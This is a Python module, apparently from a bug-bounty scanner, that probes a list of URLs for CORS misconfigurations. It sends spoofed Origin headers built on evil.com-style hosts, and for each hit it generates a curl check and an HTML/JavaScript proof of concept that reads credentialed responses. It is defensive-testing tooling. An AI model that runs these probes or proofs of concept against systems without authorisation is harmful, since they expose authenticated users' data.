import asyncio
import aiohttp
import logging
import os
from typing import List, Dict
from urllib.parse import urlparse

from core.config import Config

logger = logging.getLogger("BugBot.CORS")

class CorsChecker:
    """
    Analizador Pasivo de CORS (Cross-Origin Resource Sharing).
    Detecta configuraciones inseguras que permiten a servidores de terceros
    leer respuestas autenticadas.
    """
    
    def __init__(self, concurrency: int = 10, timeout: int = 10):
        self.semaphore = asyncio.Semaphore(concurrency)
        self.timeout = aiohttp.ClientTimeout(total=timeout)

    async def check_cors(self, session: aiohttp.ClientSession, url: str) -> Dict:
        """Prueba múltiples bypasses de CORS para detectar mala configuración."""
        target_domain = urlparse(url).netloc
        base_domain = ".".join(target_domain.split(".")[-2:])
        
        # 8 Variantes de bypass de CORS (de más común a más exótico)
        test_origins = [
            ("Arbitrary Origin", "https://evil-bugbot-test.com"),
            ("Null Origin", "null"),
            ("Suffix Match", f"https://{target_domain}.evil.com"),
            ("Prefix Match", f"https://evil-{target_domain}"),
            ("Subdomain Trick", f"https://evil.{base_domain}"),
            ("HTTP Downgrade", f"http://{target_domain}"),
            ("Backtick Bypass", f"https://{target_domain}`.evil.com"),
            ("Underscore Trick", f"https://{target_domain}_.evil.com"),
        ]

        async with self.semaphore:
            for technique, test_origin in test_origins:
                headers = Config.CUSTOM_HEADERS.copy()
                headers["Origin"] = test_origin
                
                try:
                    async with session.get(url, headers=headers, timeout=self.timeout, allow_redirects=False) as response:
                        acao = response.headers.get("Access-Control-Allow-Origin", "")
                        acac = response.headers.get("Access-Control-Allow-Credentials", "")
                        
                        is_reflected = acao == test_origin  # ACAO: * is NOT exploitable
                        has_creds = str(acac).lower() == "true"
                        
                        if is_reflected:
                            content_type = response.headers.get("Content-Type", "").lower()
                            has_data = any(ct in content_type for ct in ["json", "xml", "javascript"])
                            
                            # Wildcard sin credentials = bajo impacto
                            if acao == "*" and not has_creds:
                                continue
                            
                            severity = "HIGH" if (has_creds and has_data) else "MEDIUM" if has_creds else "LOW"
                            
                            # Generar PoC HTML
                            poc_html = self._build_poc(url, test_origin)
                            
                            return {
                                "tipo": "CORS_MISCONFIGURATION",
                                "url": url,
                                "impacto": severity,
                                "detalles": f"Bypass '{technique}' con origen '{test_origin}'. ACAO: {acao}, ACAC: {acac}",
                                "curl_poc": f'curl -H "Origin: {test_origin}" -v "{url}" | grep -i "access-control"',
                                "html_poc": poc_html
                            }
                except Exception:
                    continue
                    
        return None

    def _build_poc(self, url: str, origin: str) -> str:
        """Genera PoC HTML listo para demostrar la explotación."""
        return f"""<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', '{url}', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {{
  if (xhr.readyState == 4) {{
    // Datos robados del usuario autenticado:
    document.write(xhr.responseText);
  }}
}};
xhr.send();
</script>"""

    async def run(self, urls: List[str]) -> List[Dict]:
        """Ejecuta el escaneo de CORS de forma asíncrona contra una lista de URLs."""
        if not urls:
            return []
            
        logger.info(f"[*] Iniciando auditoría de CORS en {len(urls)} endpoints...")
        
        findings = []
        connector = Config.get_connector()
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [self.check_cors(session, u) for u in urls]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            findings = [r for r in results if r is not None and not isinstance(r, Exception)]
            
        if findings:
            logger.info(f"[+] ¡Firmas CORS Inseguras detectadas! ({len(findings)})")
        return findings
